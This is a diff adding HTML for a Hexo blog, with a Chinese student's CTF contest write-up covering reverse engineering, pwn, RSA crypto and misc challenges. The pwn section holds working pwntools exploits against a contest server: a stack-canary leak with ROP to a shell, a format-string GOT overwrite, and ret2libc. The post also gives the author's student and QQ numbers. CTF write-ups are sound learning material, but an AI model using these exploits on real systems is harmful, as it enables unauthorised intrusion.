@@ -64,6 +64,179 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-test" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/10/25/test/" class="article-date">
+  <time datetime="2020-10-24T16:19:55.000Z" itemprop="datePublished">2020-10-25</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/10/25/test/">test</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><img src="E:\study\hexo\source_posts\test\image-20201025002021789.png" alt="image-20201025002021789"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/10/25/test/" data-id="ckgnw41ci0000xsun911458a8" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-校赛" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/10/25/%E6%A0%A1%E8%B5%9B/" class="article-date">
+  <time datetime="2020-10-24T16:11:00.470Z" itemprop="datePublished">2020-10-25</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>学号 02180552</p>
+<p>年级 18级</p>
+<p>QQ 1620232290</p>
+<h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h3><p>用ida打开，shift+F12查看字符串</p>
+<p><img src="D:\markdown\image-20200925194140130.png" alt="image-20200925194140130"></p>
+<h3 id="re2"><a href="#re2" class="headerlink" title="re2"></a>re2</h3><p>根据提示，使用下载upx-3.96-win32.zip后对文件解压，然后拖入ida。</p>
+<p><img src="D:\markdown\image-20200925194624912.png" alt="image-20200925194624912"></p>
+<p><img src="D:\markdown\image-20200925194702552.png" alt="image-20200925194702552"></p>
+<p>shitf+F12查询字符串</p>
+<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="test-nc"><a href="#test-nc" class="headerlink" title="test_nc"></a>test_nc</h3><p>直接在linux下输入nc指令连接。</p>
+<h3 id="babystack"><a href="#babystack" class="headerlink" title="babystack"></a>babystack</h3><p><img src="D:\markdown\image-20200925161614619.png" alt="image-20200925161614619"></p>
+<p>用ida打开，关键函数</p>
+<p><img src="D:\markdown\image-20200925161707189.png" alt="image-20200925161707189"></p>
+<p>输入相应的字符串就可以调用getshell，直接nc连接输入就行。</p>
+<h3 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h3><p><img src="D:\markdown\image-20200925161900440.png" alt="image-20200925161900440"></p>
+<p>只开启了canary保护。</p>
+<p><img src="D:\markdown\image-20200925162055071.png" alt="image-20200925162055071"></p>
+<p><img src="D:\markdown\image-20200925162253223.png" alt="image-20200925162253223"></p>
+<p>这里有一个溢出点。</p>
+<p><img src="D:\markdown\image-20200925162349054.png" alt="image-20200925162349054"></p>
+<p>有调用system。那么基本的思路就是，通过栈溢出，将返回地址改为system的地址，然后传入参数。首先要解决的就是绕过canary。</p>
+<p>溢出点那里，可以看到有两次输入输出，且是puts输出。那么可以考虑通过覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。 问题就变成了找到canary的位置,这里的var8就是canary的地址。</p>
+<p><img src="D:\markdown\image-20200925164344601.png" alt="image-20200925164344601"></p>
+<p><img src="D:\markdown\image-20200925164402257.png" alt="image-20200925164402257"></p>
+<p>而buf在rbp-40h，canary在0x8，那么偏移就是0x40-0x8=56.</p>
+<p>所以构造56个字符，再读取8就 可以得到canary，因此里我们可以构造56个a字符，因为canary最低一个字节是“\x00”，所以泄露出来之后要减去0xa。</p>
+<p>获得canary之后，第二次输入就是是syscall。</p>
+<p>首先获得需要的地址，由于是64位，需要将参数传给rdi，需要一个pop rdi; ret</p>
+<p><img src="D:\markdown\image-20200925165509419.png" alt="image-20200925165509419"></p>
+<p><img src="D:\markdown\image-20200925165904765.png" alt="image-20200925165904765"></p>
+<p><img src="D:\markdown\image-20200925165927417.png" alt="image-20200925165927417"></p>
+<p>最后构造exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># io=process(&#x27;./canary&#x27;)</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">io = remote(<span class="string">&#x27;202.119.201.197&#x27;</span>, <span class="number">10004</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Let&#x27;s pwn it!&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;a&#x27;</span> * (<span class="number">56</span>))</span><br><span class="line">io.recvuntil(<span class="string">&quot;a&quot;</span> * <span class="number">56</span>)</span><br><span class="line">canary = u64(io.recv(<span class="number">8</span>)) - <span class="number">0xa</span></span><br><span class="line">poprdi = <span class="number">0x00000000004008e3</span></span><br><span class="line">sys = <span class="number">0x4005F0</span></span><br><span class="line">sh = <span class="number">0x0000000000400904</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;canary=&gt;&quot;</span> +<span class="built_in">hex</span>(canary))</span><br><span class="line">io.sendline(<span class="string">b&#x27;a&#x27;</span> * <span class="number">56</span> + p64(canary) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> + p64(poprdi) + p64(sh) + p64(sys))</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="fmstr"><a href="#fmstr" class="headerlink" title="fmstr"></a>fmstr</h3><p><img src="D:\markdown\image-20200925171152641.png" alt="image-20200925171152641"></p>
+<p><img src="D:\markdown\image-20200925171452769.png" alt="image-20200925171452769"></p>
+<p>显然，这有一个格式化字符串漏洞，同时也找到了后门程序。</p>
+<p><img src="D:\markdown\image-20200925171825988.png" alt="image-20200925171825988"></p>
+<p>那么思路就是，通过格式化字符串修改返回地址运行后门程序。</p>
+<p>首先找到格式化字符串的偏移量</p>
+<p><img src="D:\markdown\image-20200925172338446.png" alt="image-20200925172338446"></p>
+<p>得到偏移量8.</p>
+<p>然后就是获得需要的地址。这里调用了两次gets，只需要把gets的地址指针写入，然后通过%n修改其内容，变成执行后门程序。</p>
+<p><img src="D:\markdown\image-20200925180103467.png" alt="image-20200925180103467"><img src="D:\markdown\image-20200925182646880.png" alt="image-20200925182646880"></p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">io = remote(<span class="string">&quot;202.119.201.197&quot;</span>,<span class="number">10006</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;./fmstr&#x27;)</span></span><br><span class="line"></span><br><span class="line">sysaddr = <span class="number">0x0804857d</span></span><br><span class="line">getsaddr = <span class="number">0x804a014</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;what&#x27;s your name:&quot;</span>)</span><br><span class="line">io.sendline(fmtstr_payload(<span class="number">8</span>, &#123;getsaddr: sysaddr&#125;))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="babyrop"><a href="#babyrop" class="headerlink" title="babyrop"></a>babyrop</h3><p><img src="D:\markdown\image-20200925182957809.png" alt="image-20200925182957809"></p>
+<p><img src="D:\markdown\image-20200925183035921.png" alt="image-20200925183035921">\</p>
+<p>找到溢出点。</p>
+<p>没有找到shellcode，显然这是要rop。</p>
+<p>首先要获得一个函数的got，然后根据这个地址去查询libc，获得基址。进而得到所需要的system和‘/bin/sh’的地址，最后进行基本的栈溢出就行。</p>
+<p>buf距离ebp 6ch，那么一共需要填充0x6c+4=112个垃圾数据。</p>
+<p>观察程序，在输入之前puts函数已经执行过，就选择获取puts的got地址。</p>
+<p>构造payload 利用puts函数获得puts的got地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = flat([<span class="string">&#x27;A&#x27;</span> * <span class="number">112</span>, puts_plt, main, putgot])</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;so...you want to say:&#x27;</span>, payload)</span><br><span class="line">putgot_addr = u32(sh.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">print(<span class="built_in">hex</span>(putgot_addr))</span><br></pre></td></tr></table></figure>
+
+<p>获得了got地址后，在libc database search上查询使用的libc</p>
+<p><img src="D:\markdown\image-20200925185036043.png" alt="image-20200925185036043"></p>
+<p><img src="D:\markdown\image-20200925185050581.png" alt="image-20200925185050581"></p>
+<p>通过计算的基址与查询到的偏移可以计算出需要的地址</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># sh = process(&#x27;./babyrop&#x27;)</span></span><br><span class="line"><span class="comment"># context.log_level = &quot;debug&quot;</span></span><br><span class="line">io  = remote(<span class="string">&quot;202.119.201.197&quot;</span>,<span class="number">10001</span>)</span><br><span class="line">ret2libc3 = ELF(<span class="string">&#x27;./babyrop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = ret2libc3.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = ret2libc3.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">putgot = ret2libc3.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">&#x27;A&#x27;</span> * <span class="number">112</span>, puts_plt, main, putgot])</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;so...you want to say:&#x27;</span>, payload)</span><br><span class="line">putgot_addr = u32(sh.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">print(<span class="built_in">hex</span>(putgot_addr))</span><br><span class="line"><span class="comment"># libc = ELF(&quot;libc6-i386_2.23-0ubuntu11.2_amd64&quot;)</span></span><br><span class="line">libcbase = putgot_addr - <span class="number">0x05f150</span></span><br><span class="line">system_addr = libcbase + <span class="number">0x03a950</span></span><br><span class="line">binsh_addr = libcbase + <span class="number">0x15910b</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">&#x27;A&#x27;</span> * <span class="number">112</span>, system_addr, <span class="number">0xdeadbeef</span>, binsh_addr])</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;so...you want to say:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="backdoor-again"><a href="#backdoor-again" class="headerlink" title="backdoor_again"></a>backdoor_again</h3><p><img src="D:\markdown\image-20200925185724922.png" alt="image-20200925185724922"></p>
+<p>这道题，溢出点在判断之后，无法通过溢出修改v5的值来执行system。于是，没有思路，感觉是用到了其他我不知道的技巧，就想着看能不能搜到类似的题来看看方法。</p>
+<p><img src="D:\markdown\image-20200925190137546.png" alt="image-20200925190137546"></p>
+<p>找到一个近乎原题的wp。</p>
+<p><img src="D:\markdown\image-20200925190451308.png" alt="image-20200925190451308"></p>
+<p><img src="D:\markdown\image-20200925190502943.png" alt="image-20200925190502943"></p>
+<p><img src="D:\markdown\image-20200925190527200.png" alt="image-20200925190527200"></p>
+<p>试着copy一下exp</p>
+<p><img src="D:\markdown\image-20200925190645048.png" alt="image-20200925190645048"></p>
+<h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="幼儿园"><a href="#幼儿园" class="headerlink" title="幼儿园"></a>幼儿园</h3><p>在factordb上分解</p>
+<p><img src="D:\markdown\image-20200925201853153.png" alt="image-20200925201853153"></p>
+<p>得到pq。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line">p=<span class="number">324350545929838254331191385863847627003</span></span><br><span class="line">q=<span class="number">328413456989577256301798468872388310877</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">f=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d=gmpy2.invert(e,f)</span><br><span class="line"></span><br><span class="line">n = <span class="number">0xeb80cc09ed9780fe25cadf7c168d2da3ea24e35237e92faf5ee0d7980c11302f</span></span><br><span class="line">c = <span class="number">0x596d5175112e346590aae5a3d633e71d2d12b28b60f08f8efa82fc092acc8c2d</span></span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line">print(<span class="built_in">hex</span>(m))</span><br><span class="line">print(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure>
+
+<h3 id="小学生"><a href="#小学生" class="headerlink" title="小学生"></a>小学生</h3><p>感觉关键的代码为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dic &#x3D; [chr(i) for i in range(ord(&quot;A&quot;), ord(&quot;&#125;&quot;) + 1)]</span><br></pre></td></tr></table></figure>
+
+<p>以这个为关键词，搜索到<img src="D:\markdown\image-20200925203503392.png" alt="image-20200925203503392"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python# -*- coding&#x3D;utf8 -*-&quot;&quot;&quot;# @Author : pig# @CreatedTime:2019-11-2423:54:02# @Description :&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def de_code(c):    dic &#x3D; [chr(i) for i in range(ord(&quot;A&quot;), ord(&quot;Z&quot;) + 1)]    flag &#x3D; []    c2 &#x3D; [i for i in c.split(&quot;0&quot;)]    for i in c2:        c3 &#x3D; 0        for j in i:            c3 +&#x3D; int(j)        flag.append(dic[c3 - 1])    return flag</span><br><span class="line"></span><br><span class="line">def encode(plaintext):    dic &#x3D; [chr(i) for i in range(ord(&quot;A&quot;), ord(&quot;Z&quot;) + 1)]    m &#x3D; [i for i in plaintext]    tmp &#x3D; [];flag &#x3D; []    for i in range(len(m)):        for j in range(len(dic)):            if m[i] &#x3D;&#x3D; dic[j]:                tmp.append(j + 1)    for i in tmp:        res &#x3D; &quot;&quot;        if i &gt;&#x3D; 8:            res +&#x3D; int(i&#x2F;8)*&quot;8&quot;        if i%8 &gt;&#x3D;4:            res +&#x3D; int(i%8&#x2F;4)*&quot;4&quot;        if i%4 &gt;&#x3D;2:            res +&#x3D; int(i%4&#x2F;2)*&quot;2&quot;        if i%2 &gt;&#x3D; 1:            res +&#x3D; int(i%2&#x2F;1)*&quot;1&quot;        flag.append(res + &quot;0&quot;)    print (&quot;&quot;.join(flag)[:-1])</span><br><span class="line"></span><br><span class="line">c &#x3D; input(&quot;输入要解密的数字串:&quot;)print (de_code(c))m_code &#x3D; input(&quot;请输入要加密的数字串:&quot;)encode(m_code)</span><br></pre></td></tr></table></figure>
+
+<p>根据这个结合题目，写出脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">f=<span class="string">&quot;2108841084108840210884042088888882108881088888421088888841088842108888108888882088884108884210882088888108888421088888088888840888888841&quot;</span></span><br><span class="line">dic = [<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&quot;A&quot;</span>), <span class="built_in">ord</span>(<span class="string">&quot;&#125;&quot;</span>) + <span class="number">1</span>)]</span><br><span class="line">flag = []</span><br><span class="line">s = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(f)):</span><br><span class="line">    <span class="keyword">if</span>(f[i] != <span class="string">&#x27;0&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span>(f[i] == <span class="string">&#x27;8&#x27;</span>):</span><br><span class="line">            s = s + <span class="number">8</span></span><br><span class="line">        <span class="keyword">if</span>(f[i] == <span class="string">&#x27;4&#x27;</span>):</span><br><span class="line">            s = s + <span class="number">4</span></span><br><span class="line">        <span class="keyword">if</span>(f[i] == <span class="string">&#x27;2&#x27;</span>):</span><br><span class="line">            s = s + <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span>(f[i] == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">            s = s + <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span>(f[i] == <span class="string">&#x27;0&#x27;</span>):</span><br><span class="line">        flag.append(s)</span><br><span class="line">        s = <span class="number">0</span></span><br><span class="line">x = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    x += dic[i<span class="number">-1</span>]</span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure>
+
+<h3 id="初中生"><a href="#初中生" class="headerlink" title="初中生"></a>初中生</h3><p>根据题目给出的条件</p>
+<p>n = 84……</p>
+<p>x = -30……</p>
+<p>e = 65537</p>
+<p>c = 50……</p>
+<p>可以phi=(p-1)*(q-1)=pq-(p+q)+1，所以要构造p+q，题目给了p-q。<br>所以 (p+q)^2=(p-q)^2+4pq即可求得p+q。</p>
+<p>p=-27……..</p>
+<p>脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">x=<span class="number">-3052070064538177039316204197190587772604720575847063904632214287646067455053231054471310322671549035272267675314294983896730810628462303176753740499536650509067032550999649642312183001467325569057721784454105443122299599368088210370664912463545058026638059476152117310712548608873763578306375998350729040793659145108802752313856984121444358377361896069243965149432626400631035486457915394853541729904150184876824863707417199152978276518660302136096681722191666079256269268999389217644896376343059852127338281844120448782198891495913902938174313438531667749920307775936355947018946620720978288405012504885451732231636</span></span><br><span class="line">p=<span class="number">-27645282466792257817358384518715154123933486746276391774444263805549184785758801611331727512618316117511830402291064671589992764575159205025150465127288678123273537254064555405597566045234264775696535233870342993688075308678745590840323230545378985874470970254306849398957159842378297616929194560560009113289974948388515331563429630185479068783351179683616591359572060950115733092007970489291940798526853201952607101543451447208843400052850424803320216100092186342006347459230274434357647688100553885838717057678699728084320705167709841528456836129264040561415840443911854851862230026044112813788167529469759180327221</span></span><br><span class="line">q=p+x</span><br><span class="line">n=p*q</span><br><span class="line">phi=(p+<span class="number">1</span>)*(q+<span class="number">1</span>)</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c=<span class="number">500276652165476232076654622771677157250768179732264713523579845370773246348163260024607736441521224561215622461281586014983237858652417057155657449969056265720660829190301384970568346350223955618393888481761163081860577739642188925549367659640679318096760942544021237730989148483458109811329253634447727676739448614959129278184402908867775906054394989855924225114919908155555192049492166217426223547541734881640953812554490770886539711015590595225643347250775256347202731382399075874986175633735843442294362952658782222039304359012268388983517266514673942584394340271959108268767970975584914229361774953712985148623666397952697929068249614923619593159697025023419729477175132378161714469266964087936259094268257305699373043845836862837431528242266637009047435391814783091218052253028403118436883809360635254672757916796698717205444912499939444332318464917599147934380674170566512663319563482316813585703326406255062594138402301545958040346473049702846530817878290456916073719516628914765617094899424596847550000272048391510943841604964078978359922836810502915050553112186304778654077116518976860791033948994210848441625200565771078991918078367509133628707097275095964646533882786598320142068378456597291213602688733329815247771873609</span></span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line">print(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="真签到题"><a href="#真签到题" class="headerlink" title="真签到题"></a>真签到题</h3><p>图片拖入winhex，，末尾发现base64，转码得到一串字母，感觉可能是凯撒密码，尝试成功。</p>
+<p><img src="D:\markdown\image-20200925200450343.png" alt="image-20200925200450343"></p>
+<h3 id="能看到我吗"><a href="#能看到我吗" class="headerlink" title="能看到我吗"></a>能看到我吗</h3><p>图片残缺</p>
+<p>拖入winhex，发现是zip，改后缀名，解压爆破，图片为number，提示密码为纯数字，解压后用foremost分离出图片。<img src="D:\markdown\ff.png" alt="ff"></p>
+<h3 id="兔兔那么可爱"><a href="#兔兔那么可爱" class="headerlink" title="兔兔那么可爱"></a>兔兔那么可爱</h3><p>将flag拖到winhex，结合提示。由兔子想到可能和斐波那契数列有关</p>
+<p><img src="D:\markdown\image-20200925204458791.png" alt="image-20200925204458791"></p>
+<p>观察发现，flag以斐波那契数列的规律排布，编写脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">ff=f.read()</span><br><span class="line">arr=<span class="string">&quot;1 1 2 3 5 8 13 21 34 55 89 144 233 377 610 987 1597 2584 4181 6765 10946 17711 28657 46368 75025 121393 196418 317811 514229 832040 1346269 2178309 3524578 5702887 9227465 14930352 24157817 39088169 63245986 102334155 165580141 267914296 433494437 701408733 1134903170 1836311903 2971215073 4807526976 7778742049 12586269025 20365011074 32951280099 53316291173 86267571272 139583862445 225851433717 365435296162 591286729879 956722026041 1548008755920 2504730781961 4052739537881 6557470319842 10610209857723 17167680177565 27777890035288 44945570212853 72723460248141 117669030460994 190392490709135 308061521170129 498454011879264 806515533049393 1304969544928657 2111485077978050 3416454622906707 5527939700884757 8944394323791464 14472334024676221 23416728348467685 37889062373143906 61305790721611591 99194853094755497 160500643816367088 259695496911122585 420196140727489673 &quot;</span>.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">ii=<span class="number">0</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> arr:</span><br><span class="line">   a=a+ff[<span class="built_in">int</span>(ii)]</span><br><span class="line">   <span class="keyword">if</span> ff[<span class="built_in">int</span>(ii)]==<span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">       print(flag)</span><br><span class="line">       exit(<span class="number">0</span>)</span><br><span class="line">   ii=<span class="built_in">int</span>(i)+ii</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/10/25/%E6%A0%A1%E8%B5%9B/" data-id="ckgnw41cm0001xsun5p8sbiq5" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-article-title" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2020/10/24/article-title/" class="article-date">
@@ -288,6 +461,14 @@
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2020/10/25/test/">test</a>
+          </li>
+        
+          <li>
+            <a href="/2020/10/25/%E6%A0%A1%E8%B5%9B/">(no title)</a>
+          </li>
         
           <li>
             <a href="/2020/10/24/article-title/">article title</a>
